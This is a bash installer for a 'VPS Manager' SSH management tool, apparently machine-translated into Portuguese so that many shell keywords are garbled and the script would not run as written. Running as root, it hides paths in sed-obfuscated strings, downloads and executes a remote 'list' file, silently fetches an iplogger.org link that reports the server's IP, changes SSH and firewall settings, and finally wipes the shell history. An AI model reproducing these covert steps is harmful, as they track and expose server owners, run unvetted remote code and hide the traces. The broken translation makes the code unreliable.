#!/bin/bash
claro
[[ "$(whoami)" != "root" ]] && {
echo -e "\033[1;33m[\033[1;31mErro\033[1;33m] \033[1;37m- \033[1;33mvocê precisa executar como root\033[0m"
rm $HOME/Plus > /dev/null 2>&1; saída 0
}
_lnk=$(echo 'z1:y#x.5s0ul&p4hs$s.0a72d*ne!v89e032:3r'| sed -e 's/[^az.]//ig'| rev); _Tinta=$(echo '/3×u3#s87r/l32o4×c1a×l1/83×l24×i0b×'|sed -e 's/[^az/]//ig'); _1nk=$(echo '/3×u3#s×87r/83×l2×4×i0b×'|sed -e 's/[^az/]//ig')
cd$HOME
fun_bar () {
comando[0]="$1"
comando[1]="$2"
(
[[ -e $HOME/fim ]] && rm $HOME/fim
${comando[0]} -y > /dev/null 2>&1
${comando[1]} -y > /dev/null 2>&1
toque em $HOME/fim
) > /dev/null 2>&1 &
tput civis
echo -ne " \033[1;33mAGUARDE \033[1;37m- \033[1;33m["
enquanto verdadeiro; fazer
for((i=0; i<18; i++)); fazer
echo -ne "\033[1;31m#"
dormir 0,1s
feito
[[ -e $HOME/fim ]] && rm $HOME/fim && break
eco -e "\033[1;33m]"
dormir 1s
tput cuu1
tput dl1
echo -ne " \033[1;33mAGUARDE \033[1;37m- \033[1;33m["
feito
echo -e "\033[1;33m]\033[1;37m -\033[1;32m OK!\033[1;37m"
tput cnorm
}
função verif_key() {
krm=$(echo '5:q-3gs2.o7%8:1'|rev); chmod +x $_Ink/list > /dev/null 2>&1
[[ ! -e "$_Tinta/lista" ]] && {
echo -e "\n\033[1;31mKEY INVÁLIDA!\033[0m"
rm -rf $HOME/Plus > /dev/null 2>&1
dormir 2
claro; saída 1
}
}
echo -e "\033[1;31m═══════════════════════════════════ ═════ ════════════\033[0m"
coloque setaf 7 ; tput setab 4 ; coloque negrito; printf '%40s%s%-12s\n' "BEM VINDIDO AO VPS MANAGER" ; tput sgr0
echo -e "\033[1;31m═══════════════════════════════════ ═════ ════════════\033[0m"
eco ""
echo -e " \033[1;31mATENCAO! \033[1;33mESSE SCRIPT IRA !\033[0m"
eco ""
echo -e "\033[1;31m• \033[1;33mINSTALAR UM CONJUNTO DE SCRIPTS COMO FERRAMENTAS\033[0m"
echo -e "\033[1;33m PARA O GERENCIAMENTO DE REDE, SISTEMA E USUÁRIOS\033[0m"
eco ""
echo -e "\033[1;32m• \033[1;32mDICA! \033[1;33mULTILIZE O TEMA DARK EM SEU TERMINAL PARA\033[0m"
echo -e "\033[1;33m UMA MELHOR EXPERIÊNCIA E VISUALIZAÇÃO DO MESMO!\033[0m"
eco ""
echo -e "\033[1;31m≠×≠×≠×≠×≠×≠×≠×[\033[1;33m • \033[1;32mGIGANTE DE FERRO\033[1;33m •\033[ 1;31m ]≠×≠×≠×≠×≠×≠×≠×\033[0m"
eco ""
#------------------------------------------------- -------------------------------------------------- --------------
echo -ne "\033[1;36mGERAR UMA CHAVE GRÁTIS [N/S]: \033[1;37m"; leia x
[[ $x = @(n|N) ]] && sair
sed -i 's/Porta 22222/Porta 22/g' /etc/ssh/sshd_config > /dev/null 2>&1
serviço ssh reiniciar > /dev/null 2>&1
echo -e "\n\033[1;36mVERIFICANDO... \033[1;37m 16983:16085\033[0m" ; rm $_Ink/list > /dev/null 2>&1; wget -P $_Ink https://raw.githubusercontent.com/NT-GIT-HUB/VPS-MANAGER-1.0/main/Install/list > /dev/null 2>&1; chave_verif
durma 3s
echo "/bin/menu" > /bin/h && chmod +x /bin/h > /dev/null 2>&1
rm versão* > /dev/null 2>&1
wget https://raw.githubusercontent.com/NT-GIT-HUB/VPS-HELANO-NET-SSH-MANAGER-1.0/main/Install/versao > /dev/null 2>&1
> /dev/null 2>&1
wget https://iplogger.org/2lHZ43 > /dev/null 2>&1
> /dev/null 2>&1
rm 2lHZ43 > /dev/null 2>&1
#------------------------------------------------- -------------------------------------------------- --------------
echo -e "\n\033[1;32mKEY VALIDA!\033[1;32m"
dormir 1s
eco ""
[[ -f "$HOME/usuarios.db" ]] && {
claro
echo -e "\n\033[0;34m══════════════════════════════════ ════ ═══════════\033[0m"
eco ""
echo -e " \033[1;33m• \033[1;31mATENCAO \033[1;33m• \033[0m"
eco ""
echo -e "\033[1;33mUma base de Dados de Usuários \033[1;32m(usuarios.db) \033[1;33mFoi"
echo -e "Encontrada! Deseja mantê-la preservando o limite"
echo -e "de conexões simultâneas dos usuários ? Ou Deseja"
echo -e "criar uma nova base de dados ?\033[0m"
echo -e "\n\033[1;37m[\033[1;31m1\033[1;37m] \033[1;33mManter Base de Dados Atual\033[0m"
echo -e "\033[1;37m[\033[1;31m2\033[1;37m] \033[1;33mCriar uma Nova Base de Dados\033[0m"
echo -e "\n\033[0;34m══════════════════════════════════ ════ ═══════════\033[0m"
eco ""
coloque setaf 2 ; coloque negrito; leia -p "Opção ?: " -e -i 1 opçãodb ; tput sgr0
} || {
awk -F : '$3 >= 500 { imprimir $1 " 1" }' /etc/passwd | grep -v '^nobody' > $HOME/usuarios.db
}
[[ "$optiondb" = '2' ]] && awk -F : '$3 >= 500 { print $1 " 1" }' /etc/passwd | grep -v '^nobody' > $HOME/usuarios.db
claro
coloque setaf 7 ; tput setab 4 ; coloque negrito; printf '%35s%s%-18s\n' " AGUARDE A INSTALAÇÃO" ; tput sgr0
eco ""
eco ""
echo -e " \033[1;33m[\033[1;31m!\033[1;33m] \033[1;32mATUALIZANDO SISTEMA \033[1;33m[\033[1;31m!\033[1 ;33m]\033[0m"
eco ""
echo -e "\033[1;33mATUALIZAÇÕES COSTUMA DEMORAR UM POUCO!\033[0m"
eco ""
fun_attlist() {
apt-get atualização -y
[[ ! -d /usr/share/.plus ]] && mkdir /usr/share/.plus
echo "crz: $(data)" > /usr/share/.plus/.plus
}
fun_bar 'fun_attlist'
claro
eco ""
echo -e " \033[1;33m[\033[1;31m!\033[1;33m] \033[1;32mINSTALANDO PACOTES \033[1;33m[\033[1;31m!\033[1 ;33m] \033[0m"
eco ""
echo -e "\033[1;33mALGUNS PACOTES SÃO EXTREMAMENTE NECESSÁRIOS !\033[0m"
eco ""
inst_pct(){
_pacotes=("bc" "apache2" "cron" "screen" "nano" "descompactar" "lsof" "netstat" "net-tools" "dos2unix" "nload" "jq" "curl" "figlet" "python3" "python-pip" "sshpass")
para _prog em ${_pacotes[@]}; fazer
apto instalar $_prog -y
feito
pip instalar speedtest-cli
}
fun_bar 'inst_pct'
[[ -f "/usr/sbin/ufw" ]] && ufw permitir 443/tcp ; ufw permite 80/tcp; ufw permitir 3128/tcp; ufw permitir 8799/tcp; ufw permite 8080/tcp
claro
eco ""
echo -e " \033[1;33m[\033[1;31m!\033[1;33m] \033[1;32mFINALIZANDO \033[1;33m[\033[1;31m!\033[1; 33m] \033[0m"
eco ""
echo -e " \033[1;33mCONCLUINDO FUNÇÕES E DEFINIÇÕES! \033[0m"
eco ""
fun_bar "$_Ink/lista $_lnk $_Ink $_1nk $key"
claro
eco ""
cd$HOME
IP=$(wget -qO- ipv4.icanhazip.com)
echo -e " \033[1;33m • \033[1;32mINSTALACAO CONCLUIDA\033[1;33m • \033[0m"
eco ""
echo -e "\033[1;31m \033[1;33mCOMANDO PRINCIPAL: \033[1;32mmenu\033[0m"
echo -e "\033[1;33m MAIS INFORMACOES \033[1;31m(\033[1;36mTELEGRAM\033[1;31m): \033[1;37m@NT_Injector\033[0m"
eco -e ""
echo -e "\033[1;31m \033[1;33mURL de Usuários Online para usar no App \033[1;36mNT Injector\033[0m"
echo -e " http://$IP:8888/servidor/online"
eco -e ""
rm $HOME/Plus && cat /dev/null > ~/.bash_history && histórico -c
